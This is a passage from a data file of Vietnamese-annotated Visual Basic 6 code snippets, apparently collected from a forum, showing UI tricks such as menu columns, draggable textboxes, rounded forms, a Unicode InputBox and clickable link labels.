    mnuList4(i).Caption = "Menu Item " &amp; CStr(i + 1)
 
                     ' if we've reached the breakpoint then add a new column with a vertical bar
    If i Mod 5 = 0 Then                          ' the proper ID must be specified
      Call ModifyMenu(submenuhWnd, i, MF_BYPOSITION Or MF_MENUBARBREAK, _
                                GetMenuItemID(submenuhWnd, i), "Menu Item " &amp; CStr(i + 1))
    End If
  Next
 
 
  submenuhWnd = GetSubMenu(menuhWnd, 1) ' get the sub menu of the second top level menu (position 1)
 
  nextsubmenuhWnd = GetSubMenu(submenuhWnd, False) ' get the first sub menu of the sub menu
 
  loopnum = 1 ' set variable for trapped errors
 
  For i = 1 To 99  ' load the second menu array (rember, zero is already loaded)
    On Error GoTo TooManyMenus
    Load mnuList2(i)
    On Error GoTo 0
    mnuList2(i).Caption = "Menu Item " &amp; CStr(i + 1)
 
                     ' if we've reached the breakpoint then add a new column with a vertical bar
    If i Mod breakpoint = 0 Then                        ' the proper ID must be specified
      Call ModifyMenu(nextsubmenuhWnd, i, MF_BYPOSITION Or MF_MENUBARBREAK, _
                               GetMenuItemID(nextsubmenuhWnd, i), "Menu Item " &amp; CStr(i + 1))
    End If
  Next
 
  nextsubmenuhWnd = GetSubMenu(submenuhWnd, 1) ' get the second sub menu of the sub menu
  
  loopnum = 2 ' set variable for trapped errors
 
  For i = 1 To 99   ' load the third menu array (rember, zero is already loaded)
    On Error GoTo TooManyMenus
    Load mnuList3(i)
    On Error GoTo 0
    mnuList3(i).Caption = "Menu Item " &amp; CStr(i + 1)
 
                      ' if we've reached the breakpoint then add a new column without a vertical bar
    If i Mod breakpoint = 0 Then                       ' the proper ID must be specified
      Call ModifyMenu(nextsubmenuhWnd, i, MF_BYPOSITION Or MF_MENUBREAK, _
                                GetMenuItemID(nextsubmenuhWnd, i), "Menu Item " &amp; CStr(i + 1))
    End If
  Next
 
Exit Sub
 
TooManyMenus:
 
  ' display message telling where the error occurred
  Select Case loopnum
    Case 0
      loopstr$ = "first"
    Case 1
      loopstr$ = "second"
    Case 2
      loopstr$ = "third"
  End Select
  
  msg$ = "Ran out of menu space while loading sub menu number " &amp; CStr(i) &amp; " in the " &amp; loopstr$ &amp; " loop."
 
  MsgBox msg$, 48, "ERROR!"
 
  On Error GoTo 0
 
  Exit Sub
 
End Sub
 
Private Sub Form_Paint()
 
  ' print the text on the form
  CurrentY = 70
  CurrentX = 40
  Print "This application demonstrates adding columns and vertical bars to Visual Basic menus."
  CurrentX = 40
  Print "Explore the menus on this form to see examples of how VB menus can be *extended*."
  Print
  Print
 
  CurrentX = 40
  Print "Developed by Bryan Stafford of New Vision Software® and released into the public"
  CurrentX = 40
  Print "domain.  This application is provided ""As Is"" with no guarantee or warranty of any"
  CurrentX = 40
  Print "kind.  You may redistribute this application and the source code so long as no fee is "
  CurrentX = 40
  Print "charged and no changes have been made.  All questions and comments are"
  CurrentX = 40
  Print "welcome by e-mail at:   newvision@imt.net"
 
End Sub
 
Private Sub mnuList1_Click(index As Integer)
 
  ' report the menu that was chosen
  Dim msg$
 
  msg$ = "You chose item number " &amp; CStr(index + 1) &amp; " from the Two Level Menu"
 
  MsgBox msg$, 64, "Menu Columns Demo"
 
End Sub
 
Private Sub mnuList2_Click(index As Integer)
 
  ' report the menu that was chosen
  Dim msg$
 
  msg$ = "You chose item number " &amp; CStr(index + 1) &amp; " from the first sub menu of the Three Level Menu"
 
  MsgBox msg$, 64, "Menu Columns Demo"
 
End Sub
 
Private Sub mnuList3_Click(index As Integer)
 
  ' report the menu that was chosen
  Dim msg$
 
  msg$ = "You chose item number " &amp; CStr(index + 1) &amp; " from the second sub menu of the Three Level Menu"
 
  MsgBox msg$, 64, "Menu Columns Demo"
 
End Sub
 
Private Sub mnuList4_Click(index As Integer)
 
  ' report the menu that was chosen
  Dim msg$
 
  msg$ = "You chose item number " &amp; CStr(index + 1) &amp; " from the popup sub menu of the Two Level Menu"
 
  MsgBox msg$, 64, "Menu Columns Demo"
 
End Sub
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>092823052837</MaVD>
    <NoiDung>Cần Text1 và Command1

Option Explicit
 
  Private Declare Function ReleaseCapture Lib "user32" () As Long
  Private Declare Function SendMessage Lib "user32" Alias "SendMessageA" _
  (ByVal hWnd&amp;, ByVal wMsg&amp;, wParam As Any, lParam As Any) As Long
  Dim Mov As Boolean
  
Private Sub Command1_Click()
  Text1.MousePointer = vbArrow
  Command1.Caption = "Hãy Di Chuyên"
End Sub
 
Private Sub Text1_MouseDown(Button As Integer, Shift As Integer, x As Single, y As Single)
  If Text1.MousePointer = vbArrow Then
    Call ReleaseCapture
    Call SendMessage(Text1.hWnd, ByVal &amp;HA1&amp;, ByVal 2&amp;, ByVal 0&amp;)
    Mov = True
  End If
End Sub
 
Private Sub Text1_MouseMove(Button As Integer, Shift As Integer, x As Single, y As Single)
  If Mov Then
    Text1.MousePointer = vbDefault
    Mov = False
    Command1.Caption = "Di Chuyên Không?"
  End If
End Sub
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>093023053045</MaVD>
    <NoiDung>Cần một command1, property Index gõ vào số 0

Private Sub Command1_Click(Index As Integer)
a = Command1.Count
    Load Command1(a)
    Set btn = Command1(a)
        btn.Top = Command1(a - 1).Top + 620
        btn.Caption = "Command" &amp; a + 1
        btn.Visible = True
MsgBox "Hay Quá? Ðê làm gì nhi?"
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>093223053212</MaVD>
    <NoiDung>Kéo timer1, command1 vô form1  rồi paste code sau, F5--&gt;click command--&gt;OK:

Dim cxc(4) As Integer
Dim cyc(4) As Integer
Dim c As Byte
Private Sub Command1_Click()
c = 0
Timer1.Enabled = True
End Sub
Private Sub Form_Load()
Timer1.Enabled = False
Timer1.Interval = 3
c = 0
cxc(1) = 100
cyc(1) = 100
'---------------
cxc(2) = -100
cyc(2) = -100
'-------------
cxc(3) = 100
cyc(3) = 100
'-------------
cxc(4) = -100
cyc(4) = -100
'-------------
End Sub
Private Sub Timer1_Timer()
c = c + 1
Me.Left = Me.Left + cxc(c Mod 4 + 1)
Me.Top = Me.Top + cyc(c Mod 4 + 1)
If c = 8 Then Timer1.Enabled = False
End Sub
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>093623053634</MaVD>
    <NoiDung>Đoạn này cho vào Module

'InputBox ho tro xuat nhap du lieu Unicode co ho tro password
'Tac gia: Tran Dai Nghia (Giang Ho)
'Email: gianghopphoenix@yahoo.com
'Website: http://www.giangho.biz; http://www.caulacbovb.com
'Ngay viet: 19/05/2008
'---------------------------------------------------------
 
Private Const GWL_WNDPROC = (-4&amp;)
Private Const WH_CBT As Long = &amp;H5
Private Const HCBT_ACTIVATE As Long = &amp;H5
Public Const WM_SETTEXT = &amp;HC
Public Const WM_SETFONT = &amp;H30
Public Const NV_INPUTBOX As Long = &amp;H5000&amp;
Private Const EM_SETPASSWORDCHAR = &amp;HCC
 
Private Declare Function CreateFont Lib "gdi32" Alias "CreateFontA" (ByVal H As Long, ByVal w As Long, ByVal E As Long, ByVal O As Long, ByVal w As Long, ByVal i As Long, ByVal U As Long, ByVal s As Long, ByVal C As Long, ByVal OP As Long, ByVal CP As Long, ByVal Q As Long, ByVal PAF As Long, ByVal f As String) As Long
Private Declare Function SetWindowLong Lib "user32" Alias "SetWindowLongA" (ByVal hwnd&amp;, ByVal nIndex&amp;, ByVal dwNewLong&amp;) As Long
Private Declare Function SetWindowsHookEx Lib "user32" Alias "SetWindowsHookExA" (ByVal idHook As Long, ByVal lpfn As Long, ByVal hMod As Long, ByVal dwThreadId As Long) As Long
Private Declare Function CallNextHookEx Lib "user32" (ByVal hHook As Long, ByVal CodeNo As Long, ByVal wParam As Long, ByVal lParam As Long) As Long
Private Declare Function UnhookWindowsHookEx Lib "user32" (ByVal hHook As Long) As Long
Private Declare Function GetCurrentThreadId Lib "kernel32" () As Long
Private Declare Function FindWindowEx Lib "user32" Alias "FindWindowExA" (ByVal ParenthWnd As Long, ByVal ChildhWnd As Long, ByVal ClassName As String, ByVal Caption As String) As Long
Private Declare Function SendMessage Lib "user32" Alias "SendMessageA" (ByVal hwnd As Long, ByVal wMsg As Long, ByVal wParam As Long, lParam As Any) As Long
Public Declare Function MessageBoxW Lib "user32.dll" (ByVal hwnd As Long, ByVal lpText As Long, ByVal lpCaption As Long, ByVal uType As Long) As Long
Private Declare Function SetWindowTextW Lib "user32" (ByVal hwnd As Long, ByVal lpString As Long) As Long
Private Declare Function DefWindowProcW Lib "user32" (ByVal hwnd As Long, ByVal wMsg As Long, ByVal wParam As Long, ByVal lParam As Long) As Long
Private Declare Function PostMessage Lib "user32" Alias "PostMessageA" (ByVal hwnd As Long, ByVal wMsg As Long, ByVal wParam As Long, lParam As Any) As Long
Public Declare Function GetWindowTextW Lib "user32.dll" (ByVal hwnd As Long, ByVal lpString As Long, ByVal cch As Long) As Long
Public Declare Function GetWindowTextLengthW Lib "user32" (ByVal hwnd As Long) As Long
Private Declare Function SetTimer&amp; Lib "user32" (ByVal hwnd&amp;, ByVal nIDEvent&amp;, ByVal uElapse&amp;, ByVal lpTimerFunc&amp;)
Private Declare Function KillTimer&amp; Lib "user32" (ByVal hwnd&amp;, ByVal nIDEvent&amp;)
Public Declare Sub InitCommonControls Lib "comctl32.dll" ()
 
Private pHook2 As Long, pHook3 As Long, hEdit As Long, hIdEvent As Long, UsePass As Boolean
Private sStatic As String, sDefault As String, sTitle As String, sInput As String, txt As String
 
Private Function InputHookProc(ByVal ncode As Long, ByVal wParam As Long, ByVal lParam As Long) As Long
Dim hStatic1 As Long, hStatic2 As Long, hButton As Long, hFont As Long
InputHookProc = CallNextHookEx(pHook2, ncode, wParam, lParam)
If ncode = HCBT_ACTIVATE Then
   hFont = CreateFont(13, 0, 0, 0, 500, 0, 0, 0, 0, 0, 0, 0, 0, "Tahoma")
   
   hStatic1 = FindWindowEx(wParam, 0&amp;, "Static", vbNullString)
   hStatic2 = FindWindowEx(wParam, hStatic1, "Static", vbNullString)
   If hStatic2 = 0 Then hStatic2 = hStatic1
   SendMessage hStatic2, WM_SETFONT, hFont, ByVal 1&amp;
   DefWindowProcW hStatic2, WM_SETTEXT, &amp;H0&amp;, StrPtr(sStatic)
   DefWindowProcW wParam, WM_SETTEXT, &amp;H0&amp;, StrPtr(sTitle)
   
   hButton = FindWindowEx(wParam, 0&amp;, "Button", "OK")
   SendMessage hButton, WM_SETFONT, hFont, ByVal 1&amp;
   DefWindowProcW hButton, WM_SETTEXT, &amp;H0&amp;, StrPtr("Xác nh" &amp; ChrW(7853) &amp; "n")
   
   hButton = FindWindowEx(wParam, 0&amp;, "Button", "Cancel")
   SendMessage hButton, WM_SETFONT, hFont, ByVal 1&amp;
   DefWindowProcW hButton, WM_SETTEXT, &amp;H0&amp;, StrPtr("H" &amp; ChrW(7911) &amp; "y b" &amp; ChrW(7887))
 
    hEdit = FindWindowEx(wParam, 0&amp;, "Edit", "")
    SendMessage hEdit, WM_SETFONT, hFont, ByVal 1&amp;
    
    If sDefault &lt;&gt; "" Then
    SetWindowTextW hEdit, StrPtr(sDefault) 'Khong ho tro Tieng Viet o Input Textbox khi Style = Windows Classic
    SendKeys "+{END}" 'Select text
    End If
     
    If UsePass Then SendMessage hEdit, EM_SETPASSWORDCHAR, Asc("*"), 0
    
    UnhookWindowsHookEx pHook3
End If
End Function
 
Public Function UniInputBox(ByVal Prompt As String, Optional ByVal Title As String = "", Optional ByVal Default As String = "", Optional ByVal Password As Boolean = False) As String
    pHook3 = SetWindowsHookEx(WH_CBT, AddressOf InputHookProc, App.hInstance, GetCurrentThreadId())
    UsePass = Password
    sStatic = VnToUni(Prompt)
    sDefault = VnToUni(Default)
    sTitle = VnToUni(Title)
    SetTimer 0, NV_INPUTBOX, 50, AddressOf TimerProc 'Lay du lieu Tieng Viet o Input Text Box
    txt = InputBox(sStatic, sTitle, sDefault)
    KillTimer 0, hIdEvent
    If txt &lt;&gt; "" Then UniInputBox = StripNulls(sInput)
End Function
 
Public Sub TimerProc(ByVal hwnd&amp;, ByVal uMsg&amp;, ByVal idEvent&amp;, ByVal dwTime&amp;)
If hEdit &lt;&gt; 0 Then sInput = GetUniText(hEdit) 'Copy lien tuc ^^!
hIdEvent = idEvent
End Sub
 
Private Function GetUniText(ByVal hwnd As Long) As String
Dim lLen As Long, sBuf As String
lLen = 1 + GetWindowTextLengthW(hwnd)
If (lLen &gt; 1) Then
    sBuf = String$(lLen, 0)
    GetWindowTextW hwnd, StrPtr(sBuf), lLen
    GetUniText = (sBuf)
Else
    GetUniText = vbNullString
End If
End Function
 
Private Function StripNulls(ByVal sString As String) As String
Dim lPos As Long
    lPos = InStr(sString, vbNullChar)
    If (lPos = 1) Then
        StripNulls = vbNullString
    ElseIf (lPos &gt; 1) Then
        StripNulls = Left$(sString, lPos - 1)
        Exit Function
    End If
    StripNulls = sString
End Function
 
'Code convert TCVN3 -&gt; Unicode by TruongPhu
Public Function VnToUni(str As String) As String
Dim i&amp;, arrUNI() As String, sUni$, ABC$, UNI$
ABC = "¸µ¶·¹¨¾»¼½Æ©ÊÇÈÉËÐÌÎÏÑªÕÒÓÔÖÝ×ØÜÞãßáâä«èåæçé¬íêëìîóïñòô­øõö÷ùýúûüþ®¸µ¶·¹¡¾»¼½Æ¢ÊÇÈÉËÐÌÎÏÑ£ÕÒÓÔÖÝ×ØÜÞãßáâä¤èåæçé¥íêëìîóïñòô¦øõö÷ùýúûüþ§"
UNI = "225,224,7843,227,7841,259,7855,7857,7859,7861,7863,226,7845,7847,7849,7851,7853,233,232,7867,7869,7865,234,7871,7873,7875,7877,7879,237,236,7881,297,7883,243,242,7887,245,7885,244,7889,7891,7893,7895,7897,417,7899,7901,7903,7905,7907,250,249,7911,361,7909,432,7913,7915,7917,7919,7921,253,7923,7927,7929,7925,273,225,224,7843,227,7841,258,7855,7857,7859,7861,7863,194,7845,7847,7849,7851,7853,233,232,7867,7869,7865,202,7871,7873,7875,7877,7879,237,236,7881,297,7883,243,242,7887,245,7885,212,7889,7891,7893,7895,7897,416,7899,7901,7903,7905,7907,250,249,7911,361,7909,431,7913,7915,7917,7919,7921,253,7923,7927,7929,7925,272"
arrUNI = Split(UNI, ",")
For i = 1 To Len(str$)
If InStr(ABC, Mid(str$, i, 1)) &gt; 0 Then
 sUni = sUni &amp; ChrW(arrUNI(InStr(ABC, Mid(str$, i, 1)) - 1))
 Else
 sUni = sUni &amp; Mid(str$, i, 1)
 End If
Next
VnToUni = sUni
End Function

Đoạn này cho vào Form

Dim ret As String
 
Private Sub Form_Initialize()
InitCommonControls
End Sub
 
 
Private Sub Command1_Click()
ret = UniInputBox("InputBox hç trî nhËp xuÊt TiÕng ViÖt Unicode" &amp; vbCrLf &amp; _
"T¸c gi¶: TrÇn §¹i NghÜa (Giang Hå)" &amp; vbCrLf &amp; "Hç trî nhËp Password" &amp; vbCrLf &amp; _
"Textbox kh«ng hç trî Unicode ë Windows Classic Style", "Input Box Unicode", "NÕu thÊy hay th× nhÊn Thanks c¸i nha !")
If ret &lt;&gt; "" Then MessageBoxW hwnd, StrPtr(ret), StrPtr("www.caulacbovb.com"), 0
End Sub
 
Private Sub Command2_Click()
ret = UniInputBox("NhËp Password v« ®©y !", "Enter Password", , True)
If ret &lt;&gt; "" Then MessageBoxW hwnd, StrPtr(ret), StrPtr("www.caulacbovb.com"), 0
End Sub
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>094023054006</MaVD>
    <NoiDung>Thêm vào Form 1 Timer:

Private Sub Form_Load()
Timer1.Interval = 10
    Me.Top = Screen.Height
    Me.Left = Screen.Width - Me.Width
    Timer1.Interval = 10
End Sub
 
Private Sub Timer1_Timer()
    Me.Top = Me.Top - 50
    If Me.Top &lt; Screen.Height - Me.Height - 300 Then Timer1.Enabled = False
End Sub
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>094123054154</MaVD>
    <NoiDung>Ta sẽ có 2 Label. Label1 dùng làm link tới 1 trang web, Label2 dùng để gửi mail...

Private Declare Function ShellExecute Lib "shell32" Alias "ShellExecuteA" (ByVal hwnd As Long, ByVal lpOperation As String, ByVal lpFile As String, ByVal lpParameters As String, ByVal lpDirectory As String, ByVal nShowCmd As Long) As Long
Private Declare Function GetDesktopWindow Lib "user32" () As Long
Private Declare Function LoadCursor Lib "user32.dll" Alias "LoadCursorA" (ByVal hInstance As Long, ByVal lpCursorName As Long) As Long
Private Declare Function SetCursor Lib "user32.dll" (ByVal hCursor As Long) As Long
 
Private Const SW_SHOWNORMAL As Long = 1
Private Const SW_SHOWMAXIMIZED As Long = 3
Private Const SW_SHOWDEFAULT As Long = 10
 
Const IDC_HAND As Long = &amp;H7F89
Dim hCursor As Long
 
Private Sub Form_Load()
With Label1
        .ForeColor = clrLinkInactive
        .Caption = "http://caulacbovb.com/forum/"
   End With
   hCursor = LoadCursor(ByVal 0&amp;, IDC_HAND)
End Sub
 
Private Sub Form_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
        Label1.ForeColor = vbBlack
        Label1.Font.Underline = False
        Label2.ForeColor = vbBlack
        Label2.Font.Underline = False
End Sub
 
Private Sub Label1_Click()
    Dim sURL As String
    sURL = Label1.Caption
    Call RunShellExecute("open", sURL, 0&amp;, 0&amp;, SW_SHOWNORMAL)
End Sub
 
Private Sub Label1_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
    Label1.ForeColor = vbBlue
    Label1.Font.Underline = True
    'Set con chuột có hình bàn tay
    SetCursor hCursor
End Sub
 
Private Sub RunShellExecute(sTopic As String, sFile As Variant, sParams As Variant, sDirectory As Variant, nShowCmd As Long)
   Call ShellExecute(GetDesktopWindow(), sTopic, sFile, sParams, sDirectory, nShowCmd)
End Sub
 
Private Sub Label2_Click()
    ShellExecute hwnd, "open", "mailto:" &amp; Label2.Caption, vbNullString, vbNullString, SW_SHOW
End Sub
 
Private Sub Label2_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
    Label2.ForeColor = vbBlue
    Label2.Font.Underline = True
    'Set con chuột có hình bàn tay
    SetCursor hCursor
End Sub

</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>094223054259</MaVD>
    <NoiDung>Private Declare Function CreateEllipticRgn Lib "gdi32" (ByVal X1 As Long, ByVal Y1 As Long, ByVal X2 As Long, ByVal Y2 As Long) As Long
 
Private Declare Function SetWindowRgn Lib "user32" (ByVal hWnd As Long, ByVal hRgn As Long, ByVal bRedraw As Long) As Long 
 
Private Sub ChangeShape(po_Control As Object)
 
    Dim ll_Width As Long
    Dim ll_Height As Long
    Dim ll_Left As Long
    Dim ll_Top As Long
    Dim ll_Region As Long
 
        With po_Control
 
        ll_Width = .Width / Screen.TwipsPerPixelX
        ll_Height = .Height / Screen.TwipsPerPixelY
    End With        
 
    ll_Region = CreateEllipticRgn(0, 0, ll_Width, ll_Height)
    Call SetWindowRgn(po_Control.hWnd, ll_Region, True)
 
End Sub
 
 
Private Sub Form_Load()
    ChangeShape Command1
End Sub
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>094423054417</MaVD>
    <NoiDung>Cần 1 listbox, 1 timer

Public Cll As New Collection
'-------------------------------
Private Sub CmdMix_Click()
Dim i As Integer
For i = 0 To Lst.ListCount - 1
    Cll.Add Lst.List(i)
Next i
Lst.Clear
Tmr_Mix.Enabled = True
End Sub
'-------------------------------
Private Sub Tmr_Mix_Timer()
Dim i As Integer
Dim ITmp As Integer
For i = 0 To Cll.Count - 1
    Randomize
    ITmp = Int((Cll.Count * Rnd) + 1)
    Lst.AddItem Cll(ITmp)
    Cll.Remove ITmp
Next i
End Sub
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>095623055607</MaVD>
    <NoiDung>Sub CreatFormBoder(fr As Form, ByVal vWidth As Byte, ByVal TileBarWidth As Byte)
Dim CurScale As Byte
fr.Cls
CurScale = fr.ScaleMode
fr.ScaleMode = 3
For i = vWidth To 0 Step -1
    'Left
        fr.Line (i, 0)-(i, fr.ScaleHeight), RGB(i * 50, i * 10 + 220, i * 50)
    'Right
        fr.Line (fr.ScaleWidth - i, 0)-(fr.ScaleWidth - i, fr.ScaleHeight), RGB(i * 50, i * 10 + 220, i * 50)
    'Down
        fr.Line (0, fr.ScaleHeight - i)-(fr.ScaleWidth, fr.ScaleHeight - i), RGB(i * 50, i * 10 + 220, i * 50)
Next i
'Ve TileBar
For i = TileBarWidth To 0 Step -1
        fr.Line (0, i)-(fr.ScaleWidth, i), RGB(i * 10, i * 10 + 200, i * 10)
Next i
fr.ScaleMode = CurScale
End Sub
 
Private Sub Form_Paint()
CreatFormBoder Form1, 3, 10
End Sub 
'Add mot button vao de kiem tra
Private Sub Command1_Click()
Me.Width = Me.Width + 100
End Sub


Mình chỉ mới tạo một kiểu màu xanh này thôi, các bạn tự nghiên cứu phần màu của line thì sẽ tạo ra nhiều kiểu màu gadien hơn..
(vì là border nên tham số vWidth bạn nên cho &lt;= 5)</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>095923055913</MaVD>
    <NoiDung>Cần 1 form,BorderStyle = 0; 1 nút lệnh

Private Declare Function DeleteObject Lib "gdi32.dll" (ByVal hObject As Long) As Long
Private Declare Function CreateRoundRectRgn Lib "gdi32.dll" (ByVal X1 As Long, ByVal Y1 As Long, ByVal X2 As Long, ByVal Y2 As Long, ByVal X3 As Long, ByVal Y3 As Long) As Long
 
Private Declare Function SetWindowRgn Lib "user32.dll" (ByVal hWnd As Long, ByVal hRgn As Long, ByVal bRedraw As Boolean) As Long
 
Private Sub Command1_Click()
RoundForm Form1
End Sub
 
Sub RoundForm(ByVal fr As Form)
fr.ScaleMode = 3
Dim hRgn As Long  
hRgn = CreateRoundRectRgn(0,0, fr.ScaleWidth, fr.ScaleHeight, 5, 5) 
SetWindowRgn fr.hWnd, hRgn, True
DeleteObject hRgn
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>090123060122</MaVD>
    <NoiDung>Module

Public Sub CenterC(frm As Form)
  
    Dim SpcF As Integer 'How many spaces can fit
    Dim clen As Integer 'caption length
    Dim oldc As String 'oldcaption
    Dim i As Integer
  
    oldc = frm.Caption
    
    Do While Left(oldc, 1) = Space(1)
        DoEvents
        oldc = Right(oldc, Len(oldc) - 1)
    Loop
  
    Do While Right(oldc, 1) = Space(1)
        DoEvents
        oldc = Left(oldc, Len(oldc) - 1)
    Loop
  
    clen = Len(oldc)
  
    If InStr(oldc, "!") &lt;&gt; 0 Then
        If InStr(oldc, " ") &lt;&gt; 0 Then
            clen = clen * 1.5
        Else
            clen = clen * 1.4
        End If
    Else
        If InStr(oldc, " ") &lt;&gt; 0 Then
            clen = clen * 1.4
         Else
            clen = clen * 1.3
        End If
    End If
  
  'see how many characters can fit
    SpcF = frm.Width / 61.2244 'how many space cam fit in the caption
    SpcF = SpcF - clen
  
    If SpcF &gt; 1 Then
        DoEvents 'speed up the program
        frm.Caption = Space(Int(SpcF / 2)) + oldc
    Else 'if the form is too small for spaces
        frm.Caption = oldc
    End If
  
End Sub 

Form

Dim oldsize As Long   
 
Private Sub Form_Resize()
 
    If Me.Width = oldsize Then 'if the width hasn't changed
 
        Exit Sub 'then don't change the caption location
 
    Else
 
        CenterC Me
 
        oldsize = Me.Width
 
    End If
 
End Sub  
 
Private Sub Form_Load()
 
    Me.Caption = "Thu thuat VB6 - Nguyen Trung Tin"
 
    CenterC Me
 
    oldsize = Me.Width
 
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>090223060254</MaVD>
    <NoiDung>Private Declare Function GetWindowLong Lib "user32" Alias "GetWindowLongA" (ByVal hwnd As Long, ByVal nIndex As Long) As Long
Private Declare Function SetWindowLong Lib "user32" Alias "SetWindowLongA" (ByVal hwnd As Long, ByVal nIndex As Long, ByVal dwNewLong As Long) As Long
Private Const GWL_STYLE = (-16)
Private Const GWL_EXSTYLE = (-20)
 
Private Sub Form_Load()
'Test
Dim i As Byte
For i = 0 To 10
Combo1.AddItem "Dong thu " &amp; i
List1.AddItem "Dong thu " &amp; i
Next
 
 
Dim m_Style_Cmb As Long
m_Style_Cmb = GetWindowLong(Combo1.hwnd, GWL_EXSTYLE)
m_Style_Cmb = m_Style_Cmb Or &amp;H3000
Call SetWindowLong(Combo1.hwnd, GWL_EXSTYLE, m_Style_Cmb)
 
Dim m_Style_Lst As Long
m_Style_Lst = GetWindowLong(List1.hwnd, GWL_EXSTYLE)
' m_Style_Lst = m_Style Or &amp;H4000 'Chu canh lề Trái
m_Style_Lst = m_Style_Lst Or &amp;H5000 'Chu canh lề Phải
Call SetWindowLong(List1.hwnd, GWL_EXSTYLE, m_Style_Lst)
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>090423060456</MaVD>
    <NoiDung>Private Sub Command1_Click()
    On Error Resume Next
    Dim RandomControl(1 To 18) As String
    Dim i As Integer
    Randomize
    RandomControl(1) = "VB.TextBox"
    RandomControl(2) = "VB.CommandButton"
    RandomControl(3) = "VB.Shape"
    RandomControl(4) = "VB.Label"
    RandomControl(5) = "VB.ListBox"
    RandomControl(6) = "VB.PictureBox"
    RandomControl(7) = "VB.Frame"
    RandomControl(8) = "VB.HScrollBar"
    RandomControl(9) = "VB.VScrollBar"
    RandomControl(10) = "VB.Image"
    RandomControl(11) = "VB.Line"
    RandomControl(12) = "VB.DirListBox"
    RandomControl(13) = "VB.DriveListBox"
    RandomControl(14) = "VB.FileListBox"
    RandomControl(15) = "VB.Timer"
    RandomControl(16) = "VB.ComboBox"
    RandomControl(17) = "VB.OptionButton"
    RandomControl(18) = "VB.CheckBox"
    
    i = Int((18 * Rnd) + 1)
    RandomTop = Int(Rnd * Me.Height)
    RandomLeft = Int(Rnd * Me.Width)
    RandomWidth = Int(Rnd * Me.Height)
    RandomText = Int(Rnd * 3200)
    Set RandDynamic = Controls.Add(RandomControl(i), "Random" &amp; RandomText)
 
    With RandDynamic
        .Visible = True
        .Text = "Mr Tin"
        .Caption = "Mr Tin"
        .BackColor = vbYellow
        .Width = RandomWidth
        .Top = RandomTop
        .Left = RandomLeft
    End With
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>090623060619</MaVD>
    <NoiDung>Timer1 có Interval=1000

Private Declare Function MessageBox Lib "user32" Alias "MessageBoxA" (ByVal hwnd As Long, ByVal lpText As String, ByVal lpCaption As String, ByVal wType As Long) As Long
 
Private Sub Command1_Click()
MessageBox Me.hwnd, "Hay nhin Form Caption ! Timer van hoat dong !", "Su dung API Message", vbOKOnly
End Sub
 
Private Sub Timer1_Timer()
Me.Caption = Now
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>090823060814</MaVD>
    <NoiDung>Cần 3 Command và 1 Text

Private Declare Function SendMessage Lib "user32" Alias "SendMessageA" (ByVal hwnd As Long, ByVal wMsg As Long, ByVal wParam As Long, lParam As Any) As Long
Private Const EM_CANUNDO = &amp;HC6
Private Const EM_EMPTYUNDOBUFFER = &amp;HCD
Private Const EM_UNDO = &amp;HC7
 
Private Sub Command1_Click()
    SendMessage Text1.hwnd, EM_UNDO, 0&amp;, 0&amp;
End Sub
 
Private Sub Command2_Click()
    SendMessage Text1.hwnd, EM_EMPTYUNDOBUFFER, 0&amp;, 0&amp;
End Sub
 
Private Sub Command3_Click()
    Dim retcode As Long
    retcode = SendMessage(Text1.hwnd, EM_CANUNDO, 0&amp;, 0&amp;)
    If retcode Then
        MsgBox "TextBox có thể Undo"
    Else
        MsgBox "TextBox không thể Undo"
    End If
End Sub

</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>091023061055</MaVD>
    <NoiDung>Form có 2 Command và 1 ComboBox

Private Declare Function SendMessage Lib "USER32" Alias "SendMessageA" (ByVal hWnd As Long, ByVal wMsg As Long, ByVal wParam As Integer, ByVal lParam As Any) As Long
Private Const CB_LIMITTEXT&amp; = &amp;H141
Public Sub SetComboBoxMaxLength(hWnd As Long, MaxLength As Long)
    SendMessage hWnd, CB_LIMITTEXT&amp;, MaxLength, 0&amp;
End Sub
 
Private Sub Command1_Click()
'Xét chiều dài tối đa cho phép gõ trong ComboBox là 10
SetComboBoxMaxLength Combo1.hWnd, 10
End Sub
 
Private Sub Command2_Click()
'Gỡ bỏ, cho phép gõ thoải mái
SetComboBoxMaxLength Combo1.hWnd, 0
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>091323061308</MaVD>
    <NoiDung>Private Sub Txt1_Change()
On Error Resume Next
Dim b As String
If Val(Txt1.Text) &lt;&gt; 0 Then 'Người ta đánh số
    b = Val(Txt1.Text)
    Txt1.Text = b &amp; Right$(Txt1.Text, Len(Txt1.Text) - Len(b) - 1) 'Cái này đề phòng luôn chuyện người ta hứng quay lại giữ đường nhập chuỗi đặng bắt lỗi ct của mình, đừng có hòng!!!    SendKeys "{END}" 'Đưa trỏ về cuối dòng
ElseIf Val(Txt1.Text) = 0 And Val((Left$(Txt1.Text, 1))) = 0 Then  'Nếu người ta quay lại đầu dòng đánh, nhập chuỗi thì xử lí như dưới, còn đánh số thì bình thường rồi!
    Txt1 = Right(Txt1.Text, Len(Txt1.Text) - 1)
End If
End Sub
 
'Có thể bỏ bớt "Val((Left$(Txt1.Text, 1)))" như dưới, chẳng qua cái này để xác định chắc chắn là người ta nhập vào đầu dòng là chuỗi 
Private Sub Txt2_Change()
On Error Resume Next
Dim b As String
If Val(Txt2.Text) &lt;&gt; 0 Then 'Cái này xải ra khi người ta nhập tòan số, nhập số rồi nhập chuỗi ở sau hoặc nhập số rồi chen chuỗi ở giữa
    b = Val(Txt2.Text)
    Txt2.Text = b &amp; Right$(Txt2.Text, Len(Txt2.Text) - Len(b) - 1)
